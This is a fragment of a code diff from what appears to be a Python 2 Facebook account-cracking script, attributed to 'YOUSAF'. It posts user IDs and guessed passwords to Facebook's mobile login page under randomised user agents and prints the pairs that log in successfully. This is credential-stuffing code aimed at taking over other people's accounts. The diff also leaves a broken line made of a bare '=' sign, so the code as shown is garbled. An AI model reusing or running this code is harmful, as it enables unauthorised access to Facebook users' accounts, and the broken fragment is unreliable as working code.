@@ -1042,7 +1042,7 @@ myagents=random.choice(['Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.20
 
             
         
-           p  =
+             =
             b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
             if 'c_user' in rana.cookies.get_dict().keys():
                 print "\x1b[1;92m[YOUSAF-OK] "+uid + " | " + pass1
